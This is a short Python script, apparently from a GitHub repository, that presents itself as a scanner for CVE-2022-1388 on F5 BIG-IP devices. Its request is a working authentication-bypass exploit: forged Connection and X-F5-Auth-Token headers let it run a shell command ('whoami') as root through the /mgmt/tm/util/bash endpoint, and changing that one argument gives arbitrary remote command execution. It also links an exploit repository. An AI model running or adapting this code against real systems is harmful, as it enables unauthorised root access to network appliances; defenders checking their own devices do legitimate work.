import requests
import time
import sys
import os
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def clean():
        os.system('cls' if os.name=='nt' else 'clear')

def printer(Print):
    for c in Print + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(2. / 100)
clean()
print ("""
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗        ██╗██████╗  █████╗  █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ███║╚════██╗██╔══██╗██╔══██╗
██║     ██║   ██║█████╗       █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗╚██║ █████╔╝╚█████╔╝╚█████╔╝
██║     ╚██╗ ██╔╝██╔══╝      ██╔═══╝ ████╔╝██║██╔═══╝ ██╔═══╝ ╚════╝ ██║ ╚═══██╗██╔══██╗██╔══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗███████╗       ██║██████╔╝╚█████╔╝╚█████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚══════╝       ╚═╝╚═════╝  ╚════╝  ╚════╝ 
""")
print ("GitHub: https://github.com/AmirHoseinTangsiriNET/CVE-2022-1388-Scanner")
time.sleep(1)
print ("......")
print ("Please Enter The F5 Device Url Or IP Address For Scanning ")
Target = input("[+]:")

    
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.01; sl-SI; rv:1.9.0.20) Gecko/20110715 Firefox/36.0",
        "Content-type": "application/json",
        "Connection": "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd,X-F5-New-Authtok-Reqd,X-Forwarded-Server,X-Forwarded-Host",
        "X-F5-Auth-Token": "anything",
        "Authorization": "Basic ksjcjdj"}

uri = "/mgmt/tm/util/bash"

payload = {"command": "run", "utilCmdArgs": "-c whoami"}

def Scanner():
    try:
        print ("Started Scanning Of {0}".format(Target))
        res = requests.post(Target+uri, headers=headers, json=payload, timeout=5, verify=False)
        if (res.status_code == 200) and ("root" in res.text):
            print ("[+]Scanning Result ")
            time.sleep(1)
            printer (".....")
            print ("[-]URL: {0}".format(Target))
            print ("[-]Status: Vulnerable To CVE-2022-1388")
            time.sleep(1)
            print ("[-]Exploit: https://github.com/superzerosec/CVE-2022-1388")
            print ("[-]Refrence: https://support.f5.com/csp/article/K23605346")
        else:
            print ("[+]Scanning Result ")
            printer (".....")
            time.sleep(1)
            print ("[-]URL: {0}".format(Target))
            print ("[-]Status: Is Not Vulnerable To CVE-2022-1388")
    except Exception as e:
        print (e)
        printer (".....")
        print ("[-]Erorr")
        print ("Please Check Your Url And Try Again")
        exit
Scanner() 
